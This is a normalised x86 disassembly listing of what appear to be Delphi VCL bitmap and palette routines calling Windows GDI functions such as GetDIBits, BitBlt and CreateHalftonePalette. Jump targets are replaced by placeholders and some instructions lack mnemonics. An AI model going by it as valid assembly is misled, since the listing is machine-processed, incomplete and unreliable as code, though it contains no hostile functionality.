cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
call sub_3a88d54
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
call sub_3a88d54
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_3a8a744
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_3a64ce0
call sub_3a64ce0
jmp r-xdata
sub_3a8df25
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_3a8df34
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_3a64c5c
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_3a8df94
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
movzx eax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_3a8dff8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_3a8d4ec
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3a8e1f3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_3a8a744
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_3a8a744
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_3a8a744
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a8e1ab
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_3a8d930
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_3a8e204
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a8b8e0
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_3a8d75c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8e26c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a8ea0c
mov eax [ esi + 0x28 ]
call sub_3a8d760
mov eax [ esi + 0x2c ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8e2a8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a8ea0c
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_3a8e36a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_3a63a44
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3a8ec7c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_3a8d75c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_3a8d760
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
movzx eax [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
movzx eax [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a7aad0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_3a8e3a4
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_3a8ea0c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a8e434
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_3a8df94
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_3a8d930
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a8ec7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3a8e439
mov eax [ ebp - 0x8 ]
call sub_3a883e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_3a64c5c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_3a8e464
push ebx
mov ebx eax
mov eax ebx
call sub_3a8e758
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_3a6efbc
pop ebx
retn
sub_3a8e494
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_3a7cc20
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_3a8ea0c
lea eax [ ebx + 0x2c ]
call sub_3a6efbc
push esp
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3a8ec7c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_3a8e508
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_3a8a41c
mov eax ebx
call sub_3a8eb1c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_3a8e894
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_3a8e746
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_3a8a340
push eax
call SetStretchBltMode
mov eax ebx
call sub_3a8e7d8
movzx edx [ r-xdata ]
call sub_3a8a41c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_3a8eabc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_3a8e7d8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8e74d
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_3a8e6db
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_3a8a744
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_3a8e7d8
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3a8a8f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_3a8e758
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_3a8ea1c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_3a8e3a4
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_3a8a69c
sub_3a8e7d8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_3a8ea1c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8d568
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_3a8e464
sub_3a8e820
push ebx
mov ebx eax
mov eax ebx
call sub_3a8ea0c
mov eax ebx
call sub_3a8ea1c
mov edx ebx
mov eax ebx
call sub_3a8e464
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_3a8e844
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_3a8e8c4
push ebx
push esi
mov esi eax
mov bl 0x8
mov eax esi
call sub_3a8e844
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
lea edx [ eax + 0x18 ]
lea eax [ edx + 0x18 ]
movzx ecx [ eax + 0xe ]
cmp ecx 0x10
jg r-xdata
xor ebx ebx
jmp r-xdata
sub ecx 0x18
je r-xdata
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x6
jmp r-xdata
sub ecx 0x8
je r-xdata
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
jmp r-xdata
sub ecx 0x3
je r-xdata
mov bl 0x7
cmp [ edx + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov bl 0x2
jmp r-xdata
sub ecx 0x4
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x3
jmp r-xdata
jmp r-xdata
sub_3a8e948
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_3a88d54
mov eax ebx
call sub_3a8e894
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_3a8e7d8
xor edx edx
pop ecx
call sub_3a8a2cc
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_3a8e998
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_3a8eb1c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_3a8d930
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
movzx ecx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_3a8ea1c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_3a7cbbc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_3a8ea9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_3a8eabc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_3a8ea0c
mov eax ebx
call sub_3a8ea1c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_3a8e948
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_3a8dff8
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_3a8d4ec
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_3a8eb1c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
movzx ecx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_3a8ae3c
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_3a8d4ec
push 0x0
call GetDC
call sub_3a8a744
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_3a8ebd4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_3a8a60c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_3a8e3a4
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_3a8ea0c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_3a63a44
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_3a8ec58
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_3a7cb9c
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_3a8f314
pop esi
pop ebx
retn
sub_3a8ec7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a8ed04
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
movzx edx [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_3a8ed64
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_3a8d760
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_3a8d75c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8ed6b
push rw-data
